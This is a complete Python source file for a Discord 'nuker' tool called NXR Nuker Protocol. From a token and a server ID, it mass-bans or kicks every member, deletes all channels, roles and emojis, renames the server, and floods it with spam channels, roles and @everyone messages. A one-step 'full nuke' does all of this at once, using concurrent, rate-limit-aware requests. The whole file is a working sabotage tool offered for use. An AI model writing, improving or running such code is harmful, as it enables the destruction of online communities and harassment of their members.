# nxr_nuker_protocol.py
# NXR NUKER PROTOCOL — full-featured Discord guild nuker
# Python 3.10+ | aiohttp colorama pyyaml

import asyncio
import aiohttp
import json
import os
import sys
import time
import random
import string
from pathlib import Path

from colorama import init as cinit
cinit(autoreset=True)

try:
    import yaml
except ImportError:
    yaml = None

# -- enable VT on Windows legacy consoles -------------------------------
if os.name == "nt":
    os.system("")

API = "https://discord.com/api/v10"
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"

# ----------------------------- CONFIG -----------------------------------
DEFAULTS = {
    "nuker": {
        "reason": "NXR",
        "concurrency": 6,
        "fetch_member_limit": 1000,
        "ban_delete_days": 1,
        "guild_rename": "NXR NUKED",
        "spam_channel_name": "nxr",
        "spam_channel_amount": 50,
        "spam_channel_type": 0,
        "spam_channel_concurrency": 3,
        "spam_role_name": "nxr",
        "spam_role_amount": 50,
        "spam_role_color": 0,
        "spam_message_content": "@everyone NXR",
        "spam_message_amount": 10,
        "spam_message_delay": 0.0,
        "fullnuke_channel_spam_name": "nxr-wiped",
        "fullnuke_channel_spam_amount": 20,
        "fullnuke_role_spam_name": "nxr",
        "fullnuke_role_spam_amount": 20,
    },
    "ui": {
        "gradient_start": [255, 45, 45],
        "gradient_end":   [165, 0, 255],
        "accent":  [255, 60, 90],
        "success": [90, 240, 150],
        "warn":    [255, 200, 60],
        "error":   [255, 70, 70],
        "muted":   [120, 120, 130],
        "truecolor": True,
    },
}


def _merge(base, over):
    out = dict(base)
    for k, v in (over or {}).items():
        if isinstance(v, dict) and isinstance(out.get(k), dict):
            out[k] = _merge(out[k], v)
        else:
            out[k] = v
    return out


def _config_path():
    # prefer config.yml next to the running exe/script
    here = Path(getattr(sys, "frozen", False) and Path(sys.executable).parent or Path(__file__).parent)
    p = here / "config.yml"
    return p if p.exists() else None


def load_config():
    cfg = DEFAULTS
    if yaml is None:
        return cfg
    path = _config_path()
    if not path:
        return cfg
    try:
        with open(path, "r", encoding="utf-8") as f:
            cfg = _merge(DEFAULTS, yaml.safe_load(f) or {})
    except Exception:
        pass
    return cfg


CFG = load_config()
N = CFG["nuker"]
UI = CFG["ui"]

# ----------------------------- STYLE ------------------------------------
TRUECOLOR = bool(UI.get("truecolor", True))


def rgb(c, fallback=37):
    if not TRUECOLOR:
        return f"\x1b[{fallback}m"
    r, g, b = c
    return f"\x1b[38;2;{r};{g};{b}m"


RESET = "\x1b[0m"
BOLD = "\x1b[1m"
DIM = "\x1b[2m"

C_ACCENT = rgb(UI["accent"])
C_OK = rgb(UI["success"])
C_WARN = rgb(UI["warn"])
C_ERR = rgb(UI["error"])
C_MUTED = rgb(UI["muted"])


def _lerp(a, b, t):
    return tuple(int(a[i] + (b[i] - a[i]) * t) for i in range(3))


def gradient_line(text, start=None, end=None):
    """Colour each visible character along a horizontal gradient."""
    start = start or tuple(UI["gradient_start"])
    end = end or tuple(UI["gradient_end"])
    if not TRUECOLOR:
        return C_ACCENT + text + RESET
    chars = list(text)
    n = max(1, len(chars) - 1)
    out = []
    for i, ch in enumerate(chars):
        if ch == " ":
            out.append(ch)
            continue
        col = _lerp(start, end, i / n)
        out.append(f"\x1b[38;2;{col[0]};{col[1]};{col[2]}m{ch}")
    out.append(RESET)
    return "".join(out)


def banner():
    art = [
        "  ███▄    █ ▒██   ██▒ ██▀███     ███▄    █ ██░ ██  ██▄▀",
        "  ██ ▀█   █ ▒▒ █ █ ▒░▓██ ▒ ██▒   ██ ▀█   █▓██░ ██▒██▀▄",
        " ▓██  ▀█ ██▒░░  █   ░▓██ ░▄█ ▒  ▓██  ▀█ ██▒▒██▀▀██░",
        " ▓██▒  ▐▌██▒ ░ █ █ ▒ ▒██▀▀█▄    ▓██▒  ▐▌██▒░▓█ ░██",
        " ▒██░   ▓██░▒██▒ ░ ░░██▓ ▒██▒  ▒██░   ▓██░░▓█▒░██▓",
    ]
    print()
    for line in art:
        print(gradient_line(line))
    sub = "N X R   N U K E R   P R O T O C O L"
    tag = "[ v1.0 — full protocol ]"
    pad = " " * max(0, (len(art[0]) - len(sub)) // 2)
    print()
    print(pad + gradient_line(sub))
    print(" " * max(0, (len(art[0]) - len(tag)) // 2) + C_MUTED + tag + RESET)
    print()


def clear():
    os.system("cls" if os.name == "nt" else "clear")


def log(tag, msg, color=C_ACCENT):
    ts = time.strftime("%H:%M:%S")
    print(f"{C_MUTED}[{ts}]{RESET} {color}{BOLD}[{tag}]{RESET} {msg}")


def prompt(msg, default=None):
    d = f" {C_MUTED}({default}){RESET}" if default is not None else ""
    val = input(f"{C_ACCENT}➜ {RESET}{msg}{d}: ").strip()
    return val if val else default


# ----------------------------- CORE -------------------------------------
class NXRNuker:
    def __init__(self, token, guild_id):
        self.token = token.strip()
        self.guild_id = str(guild_id).strip()
        self.headers = {
            "Authorization": self.token,
            "User-Agent": UA,
            "Content-Type": "application/json",
        }
        self.session = None

    async def __aenter__(self):
        self.session = aiohttp.ClientSession(headers=self.headers)
        return self

    async def __aexit__(self, *a):
        await self.session.close()

    async def _req(self, method, path, **kwargs):
        url = f"{API}{path}"
        for _ in range(5):
            try:
                async with self.session.request(method, url, **kwargs) as r:
                    if r.status == 429:
                        data = await r.json()
                        await asyncio.sleep(data.get("retry_after", 2) + 0.2)
                        continue
                    if r.status in (200, 201, 204):
                        try:
                            return await r.json()
                        except Exception:
                            return {}
                    return {"error": r.status, "text": await r.text()}
            except Exception:
                await asyncio.sleep(1)
        return {"error": "failed"}

    # -- recon --
    async def fetch_guild(self):
        return await self._req("GET", f"/guilds/{self.guild_id}?with_counts=true")

    async def fetch_channels(self):
        return await self._req("GET", f"/guilds/{self.guild_id}/channels")

    async def fetch_roles(self):
        return await self._req("GET", f"/guilds/{self.guild_id}/roles")

    async def fetch_emojis(self):
        return await self._req("GET", f"/guilds/{self.guild_id}/emojis")

    async def fetch_members(self, limit=1000):
        members, after = [], "0"
        while len(members) < limit:
            batch = await self._req(
                "GET", f"/guilds/{self.guild_id}/members?limit=1000&after={after}"
            )
            if not isinstance(batch, list) or not batch:
                break
            members.extend(batch)
            after = batch[-1]["user"]["id"]
            if len(batch) < 1000:
                break
            await asyncio.sleep(0.5)
        return members

    # -- bans --
    async def ban_member(self, uid, reason, delete_days=0):
        return await self._req(
            "PUT", f"/guilds/{self.guild_id}/bans/{uid}",
            data=json.dumps({
                "delete_message_seconds": delete_days * 86400,
                "reason": reason,
            }),
        )

    async def ban_all(self, members, reason, delete_days=1, concurrency=5):
        sem = asyncio.Semaphore(concurrency)
        done = {"ok": 0, "fail": 0}

        async def worker(m):
            uid = m["user"]["id"]
            async with sem:
                r = await self.ban_member(uid, reason, delete_days)
                if "error" in r:
                    done["fail"] += 1
                else:
                    done["ok"] += 1
                    log("BAN", f"{m['user'].get('username','?')} ({uid})", C_ERR)

        await asyncio.gather(*(worker(m) for m in members))
        return done

    # -- kicks --
    async def kick_member(self, uid, reason):
        return await self._req(
            "DELETE", f"/guilds/{self.guild_id}/members/{uid}",
            data=json.dumps({"reason": reason}),
        )

    async def kick_all(self, members, reason, concurrency=5):
        sem = asyncio.Semaphore(concurrency)
        ok = 0

        async def worker(m):
            nonlocal ok
            async with sem:
                r = await self.kick_member(m["user"]["id"], reason)
                if "error" not in r:
                    ok += 1
                    log("KICK", m["user"].get("username", "?"), C_WARN)

        await asyncio.gather(*(worker(m) for m in members))
        return ok

    # -- channels --
    async def delete_channel(self, cid):
        return await self._req("DELETE", f"/channels/{cid}")

    async def delete_all_channels(self, channels, concurrency=5):
        sem = asyncio.Semaphore(concurrency)
        ok = 0

        async def worker(c):
            nonlocal ok
            async with sem:
                r = await self.delete_channel(c["id"])
                if "error" not in r:
                    ok += 1
                    log("DEL", f"#{c.get('name','?')}", C_ACCENT)

        await asyncio.gather(*(worker(c) for c in channels))
        return ok

    async def create_channel(self, name, ctype=0):
        return await self._req(
            "POST", f"/guilds/{self.guild_id}/channels",
            data=json.dumps({"name": name, "type": ctype}),
        )

    async def spam_channels(self, name, amount, ctype=0, concurrency=3):
        sem = asyncio.Semaphore(concurrency)

        async def worker(i):
            async with sem:
                n = f"{name}-{i}" if amount > 1 else name
                r = await self.create_channel(n, ctype)
                if "error" not in r:
                    log("MAKE", n, C_OK)

        await asyncio.gather(*(worker(i) for i in range(amount)))

    # -- roles --
    async def delete_role(self, rid):
        return await self._req("DELETE", f"/guilds/{self.guild_id}/roles/{rid}")

    async def delete_all_roles(self, roles, concurrency=5):
        sem = asyncio.Semaphore(concurrency)
        ok = 0

        async def worker(r):
            nonlocal ok
            if r.get("managed") or r["name"] == "@everyone":
                return
            async with sem:
                res = await self.delete_role(r["id"])
                if "error" not in res:
                    ok += 1
                    log("ROLE-", r["name"], C_ACCENT)

        await asyncio.gather(*(worker(r) for r in roles))
        return ok

    async def create_role(self, name, color=0, hoist=False, mentionable=False):
        return await self._req(
            "POST", f"/guilds/{self.guild_id}/roles",
            data=json.dumps({
                "name": name, "color": color,
                "hoist": hoist, "mentionable": mentionable,
            }),
        )

    async def spam_roles(self, name, amount, color=0):
        for i in range(amount):
            n = f"{name}-{i}" if amount > 1 else name
            r = await self.create_role(n, color)
            if "error" not in r:
                log("ROLE+", n, C_OK)

    # -- messages --
    async def send_message(self, cid, content):
        return await self._req(
            "POST", f"/channels/{cid}/messages",
            data=json.dumps({"content": content}),
        )

    async def spam_messages(self, cid, content, amount, delay=0.0):
        sent = 0
        for _ in range(amount):
            r = await self.send_message(cid, content)
            if "error" not in r:
                sent += 1
            if delay:
                await asyncio.sleep(delay)
        log("MSG", f"{sent}/{amount} → {cid}", C_OK)
        return sent

    # -- guild edit --
    async def rename_guild(self, name):
        return await self._req(
            "PATCH", f"/guilds/{self.guild_id}",
            data=json.dumps({"name": name}),
        )

    async def delete_emojis(self, emojis):
        for e in emojis:
            await self._req("DELETE", f"/guilds/{self.guild_id}/emojis/{e['id']}")
            log("EMOJI-", e.get("name", "?"), C_ACCENT)


# ----------------------------- UI ---------------------------------------
def box_top(w=50):
    return gradient_line("╔" + "═" * w + "╗")


def box_bot(w=50):
    return gradient_line("╚" + "═" * w + "╝")


def box_sep(w=50):
    return gradient_line("╠" + "═" * w + "╣")


def box_row(text, w=50):
    # visible width = len(text) (no ANSI yet)
    pad = w - len(text) - 1
    return gradient_line("║") + " " + text + " " * pad + gradient_line("║")


def draw_menu():
    w = 50
    print()
    print(box_top(w))
    print(box_row("  NXR NUKER PROTOCOL  —  ACTION MENU", w))
    print(box_sep(w))
    items = [
        ("1",  "Ban All Members"),
        ("2",  "Kick All Members"),
        ("3",  "Delete All Channels"),
        ("4",  "Spam Channels"),
        ("5",  "Delete All Roles"),
        ("6",  "Spam Roles"),
        ("7",  "Spam Messages"),
        ("8",  "Rename Guild"),
        ("9",  "Delete All Emojis"),
        ("10", "FULL NUKE  (ban + wipe + spam + rename)"),
        ("0",  "Exit"),
    ]
    for key, label in items:
        num = f"{C_ACCENT}[{key:>2}]{RESET}"
        print(gradient_line("║") + f"  {num}  {label}")
    print(box_bot(w))
    print()


def header(txt):
    print()
    print(gradient_line(f"── {txt} " + "─" * max(0, 46 - len(txt))))


# ----------------------------- ACTIONS ----------------------------------
async def act_ban(n):
    header("BAN ALL MEMBERS")
    reason = prompt("reason", N["reason"])
    dd = int(prompt("delete message days (0-7)", str(N["ban_delete_days"])))
    conc = int(prompt("concurrency", str(N["concurrency"])))
    log("SCAN", "fetching members...", C_WARN)
    members = await n.fetch_members(N["fetch_member_limit"])
    log("SCAN", f"{len(members)} members", C_WARN)
    res = await n.ban_all(members, reason, dd, conc)
    log("DONE", f"banned {res['ok']}  failed {res['fail']}", C_OK)


async def act_kick(n):
    header("KICK ALL MEMBERS")
    reason = prompt("reason", N["reason"])
    conc = int(prompt("concurrency", str(N["concurrency"])))
    members = await n.fetch_members(N["fetch_member_limit"])
    log("SCAN", f"{len(members)} members", C_WARN)
    ok = await n.kick_all(members, reason, conc)
    log("DONE", f"kicked {ok}", C_OK)


async def act_del_chans(n):
    header("DELETE ALL CHANNELS")
    conc = int(prompt("concurrency", str(N["concurrency"])))
    chans = await n.fetch_channels()
    log("SCAN", f"{len(chans)} channels", C_WARN)
    ok = await n.delete_all_channels(chans, conc)
    log("DONE", f"deleted {ok}", C_OK)


async def act_spam_chans(n):
    header("SPAM CHANNELS")
    name = prompt("channel name", N["spam_channel_name"])
    amt = int(prompt("amount", str(N["spam_channel_amount"])))
    ctype = int(prompt("type 0=text 2=voice", str(N["spam_channel_type"])))
    conc = int(prompt("concurrency", str(N["spam_channel_concurrency"])))
    await n.spam_channels(name, amt, ctype, conc)
    log("DONE", f"channel spam complete", C_OK)


async def act_del_roles(n):
    header("DELETE ALL ROLES")
    conc = int(prompt("concurrency", str(N["concurrency"])))
    roles = await n.fetch_roles()
    ok = await n.delete_all_roles(roles, conc)
    log("DONE", f"deleted {ok} roles", C_OK)


async def act_spam_roles(n):
    header("SPAM ROLES")
    name = prompt("role name", N["spam_role_name"])
    amt = int(prompt("amount", str(N["spam_role_amount"])))
    col = int(prompt("color int (0 = none)", str(N["spam_role_color"])))
    await n.spam_roles(name, amt, col)
    log("DONE", "role spam complete", C_OK)


async def act_spam_msgs(n):
    header("SPAM MESSAGES")
    chans = await n.fetch_channels()
    text = [c for c in chans if c.get("type") == 0]
    print(f"  {C_MUTED}text channels: {len(text)}{RESET}")
    cid = prompt("channel id (or 'all')", "all")
    content = prompt("message", N["spam_message_content"])
    amt = int(prompt("messages per channel", str(N["spam_message_amount"])))
    delay = float(prompt("delay (s)", str(N["spam_message_delay"])))
    targets = text if cid == "all" else [c for c in text if c["id"] == cid]
    for t in targets:
        await n.spam_messages(t["id"], content, amt, delay)
    log("DONE", "message spam complete", C_OK)


async def act_rename(n):
    header("RENAME GUILD")
    name = prompt("new guild name", N["guild_rename"])
    await n.rename_guild(name)
    log("DONE", f"renamed → {name}", C_OK)


async def act_del_emojis(n):
    header("DELETE ALL EMOJIS")
    emojis = await n.fetch_emojis()
    if isinstance(emojis, list):
        log("SCAN", f"{len(emojis)} emojis", C_WARN)
        await n.delete_emojis(emojis)
    log("DONE", "emojis cleared", C_OK)


async def act_full_nuke(n):
    header("FULL NUKE")
    reason = prompt("ban reason", N["reason"])
    conc = int(prompt("concurrency", str(N["concurrency"])))
    log("NUKE", "fetching members + channels + roles...", C_ERR)
    members, chans, roles = await asyncio.gather(
        n.fetch_members(N["fetch_member_limit"]),
        n.fetch_channels(),
        n.fetch_roles(),
    )
    log("NUKE", f"{len(members)} members | {len(chans)} channels | {len(roles)} roles", C_ERR)

    await asyncio.gather(
        n.ban_all(members, reason, N["ban_delete_days"], conc),
        n.delete_all_channels(chans, conc),
        n.delete_all_roles(roles, conc),
    )
    await n.rename_guild(N["guild_rename"])
    await n.spam_channels(
        N["fullnuke_channel_spam_name"],
        N["fullnuke_channel_spam_amount"],
        0, N["spam_channel_concurrency"],
    )
    await n.spam_roles(N["fullnuke_role_spam_name"], N["fullnuke_role_spam_amount"])
    log("DONE", "full nuke complete", C_OK)


ACTIONS = {
    "1": act_ban,
    "2": act_kick,
    "3": act_del_chans,
    "4": act_spam_chans,
    "5": act_del_roles,
    "6": act_spam_roles,
    "7": act_spam_msgs,
    "8": act_rename,
    "9": act_del_emojis,
    "10": act_full_nuke,
}


async def menu(n):
    while True:
        draw_menu()
        c = prompt("select", "0")
        if c == "0":
            print(f"\n{C_MUTED}exiting.{RESET}\n")
            return
        fn = ACTIONS.get(c)
        if not fn:
            log("ERR", "unknown option", C_ERR)
            continue
        try:
            await fn(n)
        except Exception as e:
            log("ERR", f"{type(e).__name__}: {e}", C_ERR)


async def main():
    clear()
    banner()

    token = prompt("bot token")
    gid = prompt("guild id")
    if not token or not gid:
        log("ERR", "token and guild id required", C_ERR)
        return

    async with NXRNuker(token, gid) as n:
        info = await n.fetch_guild()
        if "error" in info:
            log("ERR", f"guild fetch failed: {info}", C_ERR)
            return
        log("OK", f"{info['name']}  |  members: {info.get('approximate_member_count','?')}", C_OK)
        await menu(n)


if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print(f"\n{C_ERR}aborted.{RESET}")
